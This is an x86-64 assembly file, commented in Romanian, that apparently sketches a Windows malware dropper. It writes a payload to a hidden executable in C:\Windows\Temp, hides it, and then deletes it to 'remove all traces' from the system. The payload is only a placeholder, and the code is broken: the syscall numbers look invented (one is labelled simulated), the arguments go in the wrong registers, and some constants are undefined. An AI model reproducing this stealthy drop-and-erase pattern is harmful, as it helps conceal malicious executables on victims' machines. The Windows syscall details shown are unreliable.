section .data
    temp_file_path db "C:\\Windows\\Temp\\payload_tmp.exe", 0  ; Calea fișierului temporar
    payload_data db "Payload data here...", 0                   ; Datele care vor fi scrise în fișier
    payload_size equ $ - payload_data                           ; Dimensiunea payload-ului

section .bss
    temp_file_handle resq 1                                     ; Handle-ul fișierului temporar

section .text
    global create_temp_file
    global hide_temp_file
    global delete_temp_file

; create_temp_file
; Creează un fișier temporar și scrie payload-ul specificat.
create_temp_file:
    ; Configurare syscall pentru crearea fișierului
    mov rax, 0x55                      ; Syscall-ul pentru NtCreateFile
    mov rcx, temp_file_handle          ; Adresa pentru handle-ul fișierului
    mov rdx, temp_file_path            ; Calea către fișierul temporar
    mov r8, GENERIC_WRITE              ; Permisiuni de scriere
    mov r9, FILE_ATTRIBUTE_HIDDEN      ; Setează atributul pentru a ascunde fișierul
    syscall                            ; Apel syscall pentru crearea fișierului

    ; Scrierea payload-ului în fișierul temporar
    mov rax, 0x56                      ; Syscall-ul pentru NtWriteFile
    mov rcx, [temp_file_handle]        ; Handle-ul fișierului
    mov rdx, payload_data              ; Datele care vor fi scrise
    mov r8, payload_size               ; Dimensiunea datelor
    syscall                            ; Apel syscall pentru scriere
    ret

; hide_temp_file
; Ascunde fișierul temporar setându-i atributul "hidden".
hide_temp_file:
    ; Configurare syscall pentru a schimba atributele fișierului
    mov rax, 0x58                      ; Syscall pentru NtSetInformationFile (simulat)
    mov rcx, [temp_file_handle]        ; Handle-ul fișierului
    mov rdx, FILE_ATTRIBUTE_HIDDEN     ; Setează atributul hidden
    syscall                            ; Apel syscall pentru setare atribute
    ret

; delete_temp_file
; Șterge fișierul temporar, eliminând toate urmele de pe sistem.
delete_temp_file:
    ; Configurare syscall pentru ștergerea fișierului
    mov rax, 0x57                      ; Syscall-ul pentru NtDeleteFile
    mov rdx, temp_file_path            ; Calea fișierului temporar
    syscall                            ; Apel syscall pentru ștergere
    ret

